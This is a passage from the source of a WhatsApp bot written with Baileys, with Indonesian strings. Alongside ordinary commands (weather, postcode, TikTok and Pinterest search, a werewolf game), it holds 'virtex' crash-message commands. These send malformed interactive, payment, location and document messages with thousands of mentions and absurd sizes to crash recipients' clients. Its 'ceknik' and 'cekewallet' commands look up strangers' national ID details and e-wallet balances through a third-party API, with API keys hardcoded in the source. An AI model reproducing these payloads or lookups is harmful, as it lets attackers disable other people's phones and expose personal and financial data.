                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAPwMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQEGAQADAQEAAAAAAAAAAAAAAAABAgMABP/aAAwDAQACEAMQAAAAz2QAZ/Q57OSj+gLlnhnQdIBnhbzugXQZXcL6CF2XcIhqctQY3oMPokgQo6ArA2ZsVnlYUvnMq3lF7UfDKToz7SneaszZLzraR84aSDD7Jn//xAAhEAACAgIDAAMBAQAAAAAAAAABAgADBBESITETIkFRgf/aAAgBAQABPwAX2A2Op9MOSj1cbE7mEgqxy8NhsvDH+9RF12YGnFTLamPg3MnFONYFDbE+1liLx9MzXNVVdan8gdgVI/DEzlYaY9xbQRuJZyE5zKT5Mhj+ATGrUXDZ6EznJs3+RuvDOz3MXJRfo8+Sv1HE+xjsP2WMEfce5XUrv2MnoI6EJB8laAnuVUdgxelj1lpkE89Q7iO0ABGx/olNROyRE2hituW9IZah2TOBI7E48PYnEJsSm3YG4AGE4lfJk2a0sZuTdxiCpIjAOkLlQBqUOS2ojagOxMonmDOXsJHHqIdtLqSdESisq2yI2otnGZP2oVoDPNiBSBvUqO9SwdQGan//xAAdEQADAQADAAMAAAAAAAAAAAAAAQIRECExMkGB/9oACAECAQE/AMlpMXejivs2kydawnr0pKkWkvHpDOitzoeMldIw1OWNaR5+8P5cf//EAB0RAAIDAAIDAAAAAAAAAAAAAAERAAIQAxIgMVH/2gAIAQMBAT8Acpx2tXsIdZHowNwaPBF4M+Z//9k="
                }
              }
            }
          }, { userJid: m.chat, quoted: fkontak });
          await sych.relayMessage(m.chat, {
            botInvokeMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadataVersion: 2,
                  deviceListMetadata: {}
                },
                interactiveMessage: {
                  nativeFlowMessage: {
                    buttons: [{
                      name: "payment_info",
                      buttonParamsJson: "{\"currency\":\"INR\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4PVSNK5RNNJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"🦄드림 가이 Cela;\",\"key\":\"🦄드림 가이 Cela\",\"key_type\":\"RANDOM\"}}]}"
                    }]
                  }
                }
              }
            }
          },  { userJid: m.chat, quoted: fkontak });
          await sych.relayMessage(m.chat, {
            viewOnceMessage: {
              message: {
                liveLocationMessage: {
                  degreesLatitude: 11111111,
                  degreesLongitude: -111111,
                  caption: "xeontex",
                  url: "https://" + "" + ".com",
                  sequenceNumber: "1678556734042001",
                  jpegThumbnail: null,
                  expiration: 7776000,
                  ephemeralSettingTimestamp: "1677306667",
                  disappearingMode: {
                    initiator: "INITIATED_BY_ME",
                    inviteLinkGroupTypeV2: "DEFAULT",
                    messageContextInfo: {
                      deviceListMetadata: {
                        senderTimestamp: "1678285396",
                        recipientKeyHash: "SV5H7wGIOXqPtg==",
                        recipientTimestamp: "1678496731",
                        deviceListMetadataVersion: 2
                      }
                    }
                  },
                  contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: "Powered By 𝘓𝘢𝘯𝘨𝘻 𝘐𝘯 𝘏𝘦𝘳𝘦",
                newsletterJid: "120363373320014871@newsletter",
                serverMessageId: 143
            }
        }
                }
              }
            }
          },{ userJid: m.chat, quoted: fkontak });
        }
        break
        
        case 'ggt': {
    await sych.relayMessage(m.chat, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Halo Bro",
                        format: "EXTENSIONS_1"
                    },
                    nativeFlowResponseMessage: {
                        name: 'galaxy_message',
                        paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        version: 3
                    }
                }
            }
        }
    }, 
{ userJid: m.chat, quoted: fkontak });
}
break;
        case 'virtex': {
    try {
        let virtex = "Cella";
        let buttons = Array.from({ length: 200 }, () => ({
            name: 'call_permission_request',
            buttonParamsJson: '{}'
        }));
        let overJids = Array.from({ length: 5 }, () => m.chat); // Batasi jumlah untuk mencegah crash

        await sych.relayMessage(m.chat, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            documentMessage: {
                                url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                fileLength: "999999999",
                                pageCount: 1, // Set nilai yang realistis
                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                fileName: virtex,
                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                mediaKeyTimestamp: Date.now() / 1000, // Gunakan timestamp yang benar
                                contactVcard: true
                            },
                            title: "haha",
                            hasMediaAttachment: true
                        },
                        body: {
                            text: "hshsh"
                        },
                        nativeFlowMessage: {},
                        contextInfo: {
                            mentionedJid: overJids,
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Xinn" }]
                        }
                    }
                }
            },
            contextInfo: {
                mentionedJid: overJids,
                externalAdReply: {
                    showAdAttribution: true,
                    renderLargerThumbnail: false,
                    title: "-> .⃟  𝗖𝗲𝗹͢𝗹𝗮𝗖𝗿͢𝗮𝘀𝗵😈⃤ ",
                    body: "—??",
                    previewType: "VIDEO",
                    thumbnail: "",
                    sourceUrl: "https://byxzmods.com",
                    mediaUrl: "https://byxzmods.com"
                }
            }
        },{ userJid: m.chat, quoted: fkontak });

        console.log(chalk.green("Cella Bot | Virtex Sent Successfully"));
    } catch (error) {
        console.error(chalk.red("Cella Bot | Error Sending Virtex: "), error);
    }
};
break;
        
case 'ggl': {

    
        let menu = `Halo ${m.pushName ? m.pushName : 'Tanpa Nama'}, Welcome ke katalog kami!`;

        // Membuat pesan katalog dengan gambar eksternal
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
            },
            productMessage: {
                product: {
                    productImage: {
                        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPO0xx8wj-yC22H5a8y77wnqiuDocaXKcWwrM7NdXp3qrCIlyfg8DOrl_rdyjmnsHd7DuxbflVI6sagEtFf-phCVDQymWsdDMT570nfxA?ccb=9-4&oh=01_Q5AaIJgQB7je7zNYpSKyrZereWgyMw4vd-lwYeo0U_0gAQhh&oe=67C79978&_nc_sid=e6ed6c&mms3=true",
                        mimetype: "image/jpeg",
                        fileSha256: "T3/s9mIeDZaVkg3TVeEDWwOPdEIcY5pOWbNTuU8LZLk=",
                        fileEncSha256: "MUT7J+sx3ySh4a49wxlhqoxI1LbOGV6JrId49oCGvoc=",
                        mediaKey: "Pg5gueOYm9s7ENS74rtF88IuBa1vcyVBcmznZm3PiNE=",
                        fileLength: { low: 14892, high: 0, unsigned: true },
                        height: 500,
                        width: 500,
                        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAD8APwMBIgACEQEDEQH/xAAtAAEAAwEBAAAAAAAAAAAAAAAAAgUGBAMBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAA0glAAAEDkzEJ3XZe5HqTU+9VaSQqbqJkefYUV3w2kL9JiZAAAA//xAAmEAACAQMEAAYDAAAAAAAAAAABAgMABBEFEhMhECAjMUBRIkFC/9oACAEBAAE/APhXt6lpHn3apNUvZW6fbSX13auBI4eor62ljD8gpbmBjgSDxd0QZZgBWpXHPdnBytcUfXQqSL0c/wBZrTTwFuSPOaWGS5IzGI0odCpWZI2ZRkgUskJ/Obc7/WOhVzHE0skm3ANbIzjA/WfeuNAMA9GtKtvVklI8m1foVPbRToVdak0SUNmKSoNEIbM0lIixqFUYA+H/AP/EABgRAQADAQAAAAAAAAAAAAAAAAEAECAR/9oACAECAQE/AMhEvsXX/8QAGxEAAgMAAwAAAAAAAAAAAAAAAQIAESAQMkH/2gAIAQMBAT8AyqloQV5DUOsZgfK1/9k="
                    },
                    productId: "9103360316413843",
                    currencyCode: "USD",
                    priceAmount1000: { low: 1316133912, high: 2328, unsigned: false },
                    title: "RKA STORE ©Powered by Langz",
                    description: "RKA STORE\n\n" +
    "Halo Welcome\n" +
    "RKA STORE berkomitmen untuk memberikan pengalaman belanja yang mudah, nyaman, dan aman. Dengan layanan cepat serta responsif, kami siap membantu Anda kapan saja. \n\n" +
    "RKA STORE – Terintegrasi Dengan API, Belanja Mudah, Cepat, & Aman!\n\n" +
    "Daftar kategori produk yang tersedia di bawah ini:\n\n" +
    "╭─❍「 Game Populer 」❍\n" +
    "│✧ MLBB\n" +
    "│✧ ML_WDP\n" +
    "│✧ ML_SL\n" +
    "│✧ ML_TL\n" +
    "│✧ Hok\n" +
    "│✧ AOV\n" +
    "│✧ LOL\n" +
    "│✧ COC\n" +
    "│✧ FF\n" +
    "│✧ PUBG\n" +
    "╰────❍\n\n" +
    "╭─❍「 Data Internet 」❍\n" +
    "│✧ BYU DATA\n" +
    "│✧ TELKOMSEL DATA\n" +
    "│✧ XL DATA\n" +
    "│✧ AXIS DATA\n" +
    "│✧ ISAT DATA\n" +
    "│✧ TRI DATA\n" +
    "╰────❍\n\n" +
    "╭─❍「 Pulsa Reguler & Transfer 」❍\n" +
    "│✧ BYU PULSA\n" +
    "│✧ TELKOMSEL PULSA\n" +
    "│✧ XL PULSA\n" +
    "│✧ AXIS PULSA\n" +
    "│✧ ISAT PULSA\n" +
    "│✧ TRI PULSA\n" +
    "╰────❍\n\n" +
    "╭─❍「 Voucher 」❍\n" +
    "│✧ PLN\n" +
    "╰────❍",
                    productImageCount: 1
                },
                businessOwnerJid: "17089003182@s.whatsapp.net",
                contextInfo: {
                    mentionedJid: [m.sender],
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: '120363373320014871@newsletter',
                        newsletterName: 'Powered By Galangxyz',
                        serverMessageId: -1
                    }
                    }
            }
        }
    }
}, { quoted: m });
await sych.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });

        let locationMsg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    "newsletterAdminInviteMessage": {
                        "newsletterJid": `120363396726721623@newsletter`,
                        "newsletterName": "virtex",
                        "jpegThumbnail":  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAD8APwMBIgACEQEDEQH/xAAtAAEAAwEBAAAAAAAAAAAAAAAAAgUGBAMBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAA0glAAAEDkzEJ3XZe5HqTU+9VaSQqbqJkefYUV3w2kL9JiZAAAA//xAAmEAACAQMEAAYDAAAAAAAAAAABAgMABBEFEhMhECAjMUBRIkFC/9oACAEBAAE/APhXt6lpHn3apNUvZW6fbSX13auBI4eor62ljD8gpbmBjgSDxd0QZZgBWpXHPdnBytcUfXQqSL0c/wBZrTTwFuSPOaWGS5IzGI0odCpWZI2ZRkgUskJ/Obc7/WOhVzHE0skm3ANbIzjA/WfeuNAMA9GtKtvVklI8m1foVPbRToVdak0SUNmKSoNEIbM0lIixqFUYA+H/AP/EABgRAQADAQAAAAAAAAAAAAAAAAEAECAR/9oACAECAQE/AMhEvsXX/8QAGxEAAgMAAwAAAAAAAAAAAAAAAQIAESAQMkH/2gAIAQMBAT8AyqloQV5DUOsZgfK1/9k=", // Menggunakan Uint8Array yang valid
                        "caption": "> virtex",
                        serverMessageId: 143,
                        "inviteExpiration": Date.now() + 1814400000 // 3 hari dari sekarang
                    }
                }
            }
        }, { userJid: m.chat, quoted: fkontak });


    await sych.relayMessage(m.chat, locationMsg.message, { messageId: locationMsg.key.id });
   
        
    await sych.relayMessage(
        m.chat,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 1316134911,
                                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                                fileName: "🦄드림 가이 Xeon",
                                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1726867151",
                                contactVcard: true,
                                jpegThumbnail: ""
                            }
                        },
                        body: {
                            text: "Powered by Langz\n@916909137213"
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "cta_url",
                                    buttonParamsJson: `{
                                        "display_text": "🦄드림 가이 Xeon",
                                        "url": "https://youtube.com/dgxeon",
                                        "merchant_url": "https://youtube.com/dgxeon"
                                    }`
                                },
                                {
                                    name: "call_permission_request",
                                    buttonParamsJson: "{}"
                                }
                            ],
                            messageParamsJson: "{}"
                        },
                        contextInfo: {
                            mentionedJid: [
                                "916909137213@s.whatsapp.net",
                                ...Array.from(
                                    { length: 30000 },
                                    () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                                )
                            ],
                            forwardingScore: 1,
                            isForwarded: true,
                            fromMe: false,
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                            quotedMessage: {
                                documentMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                    fileLength: "9999999999999",
                                    pageCount: 1316134911,
                                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                    fileName: "🦄드림 가이 Xeon",
                                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                    directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                    mediaKeyTimestamp: "1724474503",
                                    contactVcard: true,
                                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                    jpegThumbnail: ""
                                }
                            }
                        }
                    }
                }
            }
        },
        { userJid: m.chat, quoted: fkontak }
    );
}
break;

case 'ceknik': {
    if (!args[0]) return sycreply(`Masukkan NIK yang ingin dicek!\n\nContoh: *${prefix}ceknik 1671030502030006*`);

    let nik = args[0];
    let apiUrl = `https://api.autoresbot.com/api/database/ceknik?apikey=21909c8cc878c2dd482ac9672585b622&nik=${nik}`;

    try {
        let response = await fetch(apiUrl);
        let result = await response.json();

        if (result.message !== "NIK valid") {
            return sycreply(`⚠️ NIK tidak ditemukan atau tidak valid.`);
        }

        let data = result.data;
        let text = `*🔍 Hasil Pengecekan NIK*\n\n`
            + `✅ *Status:* ${result.message}\n`
            + `🏙️ *Provinsi:* ${data.provinsi}\n`
            + `🏡 *Kabupaten/Kota:* ${data.kabupaten}\n`
            + `🏠 *Kecamatan:* ${data.kecamatan}\n`
            + `🎂 *Tanggal Lahir:* ${data.tgl_lahir}\n`
            + `🚻 *Jenis Kelamin:* ${data.jenis_kelamin}`;

        sycreply(text);
    } catch (error) {
        sycreply(`⚠️ Terjadi kesalahan saat mengambil data.\n\n${error}`);
    }
    break;
}

case 'cekewallet': {
    if (!args[0]) return sycreply(`Silakan masukkan nomor e-wallet!\n\nContoh: *${prefix}cekewallet 6282280993065*`);

    let nomor = args[0];
    let apikey = 'a0ffffce7bcb95cca11a2e61';
    let url = `https://api.autoresbot.com/api/database/ewallet?apikey=${apikey}&number=${nomor}`;

    try {
        let response = await fetch(url);
        let data = await response.json();

        if (data.status && data.result) {
            let info = `*🔍 Cek Saldo E-Wallet*\n\n` +
                       `📌 *Nomor*: ${nomor}\n` +
                       `💰 *Saldo*: ${data.result.saldo}\n` +
                       `📅 *Update*: ${data.result.last_update}\n\n` +
                       `✅ Data berhasil diperoleh.`;
            sycreply(info);
        } else {
            sycreply(`⚠️ Data tidak ditemukan atau terjadi kesalahan.`);
        }
    } catch (error) {
        console.error(error);
        sycreply(`❌ Terjadi kesalahan saat menghubungi API.`);
    }
    break;
}
case 'kodepos': {
    if (!args.length) return sycreply(`Silakan masukkan nama daerah!\n\nContoh: *${prefix}kodepos pasiran jaya*`);

    let daerah = args.join(' '); // Menggabungkan argumen dengan spasi
    let url = `https://api.siputzx.my.id/api/tools/kodepos?form=${daerah}`;

    try {
        let response = await fetch(url);
        let data = await response.json();

        console.log(data);  // Menambahkan log untuk melihat respons API

if (data.status && data.data && data.data.length > 0) {
    let info = `*🔍 Cek Kode Pos*\n\n` +
               `📌 *Daerah*: ${daerah}\n` +
               `📬 *Kode Pos*: ${data.data[0].kodepos}\n` +
               `📍 *Desa*: ${data.data[0].desa}\n` +
               `🏙️ *Kecamatan*: ${data.data[0].kecamatan}\n` +
               `🌆 *Kota*: ${data.data[0].kota}\n` +
               `🏞️ *Provinsi*: ${data.data[0].provinsi}\n\n` +
               `✅ Data berhasil diperoleh.`;
    sycreply(info);
} else {
    sycreply(`⚠️ Data tidak ditemukan atau terjadi kesalahan. Pastikan nama daerah benar.`);
}
    } catch (error) {
        console.error(error);
        sycreply(`❌ Terjadi kesalahan saat menghubungi API.`);
    }
    break;
}

case 'tiktok2': {
    if (!args.length) return sycreply(`Silakan masukkan kata kunci pencarian!\n\nContoh: *${prefix}tiktok2 garam*`);

    let query = args.join(' '); // Menggabungkan argumen menjadi query
    let url = `https://api.diioffc.web.id/api/search/tiktok?query=${query}`;

    try {
        let response = await fetch(url);
        let data = await response.json();

        console.log(data);  // Menambahkan log untuk melihat respons API

        if (data.status && data.result && data.result.length > 0) {
            let text = `Hasil pencarian TikTok untuk: ${query}`;
            let anu = data.result.map(item => item.thumbnail); // Mengambil URL thumbnail dari hasil API

            // Menyusun carousel cards untuk hasil pencarian
            const carouselCards = await Promise.all(anu.slice(0, 10).map(async (url, index) => ({
                header: {
                    title: `Video ${index + 1}`,
                    hasMediaAttachment: true,
                    imageMessage: (await generateWAMessageContent({
                        image: { url }
                    }, {
                        upload: sych.waUploadToServer
                    })).imageMessage
                },
                body: {
                    text: `Judul: ${data.result[index].title}\nDurasi: ${data.result[index].duration}s`
                },
                footer: {
                    text: `Video TikTok oleh: ${data.result[index].author.name}`
                },
                nativeFlowMessage: {
                    buttons: [{
                        "name": "cta_url",
                        "buttonParamsJson": JSON.stringify({
                            display_text: "Tonton di TikTok",
                            url: `https://www.tiktok.com/@${data.result[index].author.username}/video/${data.result[index].video_id}`
                        })
                    }]
                }
            })));

            // Membuat pesan carousel
            const carouselMessage = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                            body: {
                                text: `Hasil pencarian untuk: ${query}`
                            },
                            footer: {
                                text: "_Powered by Galangxyz_"
                            },
                            header: {
                                hasMediaAttachment: false
                            },
                            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                cards: carouselCards
                            })
                        })
                    }
                }
            }, {});

            // Mengirim pesan carousel
            await sych.relayMessage(m.chat, carouselMessage.message, {
                messageId: carouselMessage.key.id
            });
        } else {
            sycreply(`⚠️ Tidak ada hasil ditemukan untuk "${query}".`);
        }
    } catch (error) {
        console.error("Kesalahan saat mengirim carousel:", error);
        sycreply(`❌ Terjadi kesalahan saat memproses permintaan.`);
    }
    break;
}


			case 'pin': {
    if (!args.length) return sycreply(`Silakan masukkan kata kunci pencarian!\n\nContoh: *${prefix}pin gojo*`);

    let query = args.join(' '); // Menggabungkan argumen menjadi query
    let url = `https://api.diioffc.web.id/api/search/pinterest?query=${query}`;

    try {
        let response = await fetch(url);
        let data = await response.json();

        console.log(data);  // Menambahkan log untuk melihat respons API

        if (data.status && data.result && data.result.length > 0) {
            let text = `Hasil pencarian Pinterest untuk: ${query}`;
            let anu = data.result.map(item => item.src); // Mengambil URL gambar dari hasil API

            // Menyusun carousel cards untuk hasil pencarian
            const carouselCards = await Promise.all(anu.slice(0, 10).map(async (url, index) => ({
                header: {
                    title: `Hasil ${index + 1}`,
                    hasMediaAttachment: true,
                    imageMessage: (await generateWAMessageContent({
                        image: { url }
                    }, {
                        upload: sych.waUploadToServer
                    })).imageMessage
                },
                body: {
                    text: `Hasil pencarian Pinterest untuk: ${query}`
                },
                footer: {
                    text: "Klik tombol di bawah untuk melihat sumber."
                },
                nativeFlowMessage: {
                    buttons: [{
                        "name": "cta_url",
                        "buttonParamsJson": JSON.stringify({
                            display_text: "Lihat di Pinterest",
                            url: `https://www.pinterest.com/pin/${data.result[index].link.split('/')[4]}`
                        })
                    }]
                }
            })));

            // Membuat pesan carousel
            const carouselMessage = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                            body: {
                                text: `Hasil pencarian untuk: ${query}`
                            },
                            footer: {
                                text: "_Powered By Galangxyz_"
                            },
                            header: {
                                hasMediaAttachment: false
                            },
                            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                cards: carouselCards
                            })
                        })
                    }
                }
            }, {});

            // Mengirim pesan carousel
            await sych.relayMessage(m.chat, carouselMessage.message, {
                messageId: carouselMessage.key.id
            });
        } else {
            sycreply(`⚠️ Tidak ada hasil ditemukan untuk "${query}".`);
        }
    } catch (error) {
        console.error("Kesalahan saat mengirim carousel:", error);
        sycreply(`❌ Terjadi kesalahan saat memproses permintaan.`);
    }
    break;
}

case 'cuaca': {
    if (!args.length) return sycreply(`Silakan masukkan nama kota!\n\nContoh: *${prefix}cekcuaca Palembang*`);

    let city = args.join(' '); // Menggabungkan argumen menjadi nama kota
    let url = `https://api.diioffc.web.id/api/tools/cekcuaca?query=${city}`;

    try {
        let response = await fetch(url);
        let data = await response.json();

        console.log(data);  // Menambahkan log untuk melihat respons API

        if (data.status && data.result) {
            let weather = data.result.weather[0];
            let main = data.result.main;
            let wind = data.result.wind;
            let sys = data.result.sys;

            let weatherDescription = weather.description;
            let temperature = main.temp;
            let feelsLike = main.feels_like;
            let minTemp = main.temp_min;
            let maxTemp = main.temp_max;
            let humidity = main.humidity;
            let windSpeed = wind.speed;
            let windDegree = wind.deg;
            let cityName = data.result.name;
            let sunrise = new Date(sys.sunrise * 1000).toLocaleTimeString();
            let sunset = new Date(sys.sunset * 1000).toLocaleTimeString();

            // Membuat teks cuaca
            let weatherText = `
Cuaca di *${cityName}*:
🌤️ *${weather.main}* - ${weatherDescription}
🌡️ Suhu: ${temperature}°C (Feels like: ${feelsLike}°C)
🌡️ Suhu Min: ${minTemp}°C, Suhu Max: ${maxTemp}°C
💧 Kelembapan: ${humidity}%
💨 Kecepatan Angin: ${windSpeed} m/s
🕒 Matahari Terbit: ${sunrise}
🕕 Matahari Terbenam: ${sunset}
            `;

            sycreply(weatherText);
        } else {
            sycreply(`⚠️ Tidak ada data cuaca ditemukan untuk kota "${city}".`);
        }
    } catch (error) {
        console.error("Kesalahan saat mengakses data cuaca:", error);
        sycreply(`❌ Terjadi kesalahan saat memproses permintaan cuaca.`);
    }
    break;
}
//xnxx

case 'ww':
case 'werewolf': {
     
let jimp = require("jimp")
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};

let {
    emoji_role,
    sesi,
    playerOnGame,
    playerOnRoom,
    playerExit,
    dataPlayer,
    dataPlayerById,
    getPlayerById,
    getPlayerById2,
    killWerewolf,
    killww,
    dreamySeer,
    sorcerer,
    protectGuardian,
    roleShuffle,
    roleChanger,
    roleAmount,
    roleGenerator,
    addTimer,
    startGame,
    playerHidup,
    playerMati,
    vote,
    voteResult,
    clearAllVote,
    getWinner,
    win,
    pagi,
    malam,
    skill,
    voteStart,
    voteDone,
    voting,
    run,
    run_vote,
    run_malam,
    run_pagi
} = require('./lib/werewolf.js')

// [ Thumbnail ] 
let thumb =
    "https://user-images.githubusercontent.com/72728486/235316834-f9f84ba0-8df3-4444-81d8-db5270995e6d.jpg";

    const {
        sender,
        chat
    } = m;
    sych.werewolf = sych.werewolf ? sych.werewolf : {};
    const ww = sych.werewolf ? sych.werewolf : {};
    const data = ww[chat];
    const value = args[0];
    const target = args[1];

    // [ Membuat Room ]
    if (value === "create") {
        if (chat in ww) return sycreply("Group masih dalam sesi permainan");
        if (playerOnGame(sender, ww) === true)
            return sycreply("Kamu masih dalam sesi game");
        ww[chat] = {
            room: chat,
            owner: sender,
            status: false,
            iswin: null,
            cooldown: null,
            day: 0,
            time: "malem",
            player: [],
            dead: [],
            voting: false,
            seer: false,
            guardian: [],
        };
        await sycreply("Room berhasil dibuat, ketik *.ww join* untuk bergabung");

        // [ Join sesi permainan ]
    } else if (value === "join") {
        if (!ww[chat]) return sycreply("Belum ada sesi permainan");
        if (ww[chat].status === true)
            return sycreply("Sesi permainan sudah dimulai");
        if (ww[chat].player.length > 16)
            return sycreply("Maaf jumlah player telah penuh");
        if (playerOnRoom(sender, chat, ww) === true)
            return sycreply("Kamu sudah join dalam room ini");
        if (playerOnGame(sender, ww) === true)
            return sycreply("Kamu masih dalam sesi game");
        let data = {
            id: sender,
            number: ww[chat].player.length + 1,
            sesi: chat,
            status: false,
            role: false,
            effect: [],
            vote: 0,
            isdead: false,
            isvote: false,
        };
        ww[chat].player.push(data);
        let player = [];
        let text = `\n*⌂ W E R E W O L F - P L A Y E R*\n\n`;
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )}\n`;
            player.push(ww[chat].player[i].id);
        }
        text += "\nJumlah player minimal adalah 5 dan maximal 15";
        sych.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
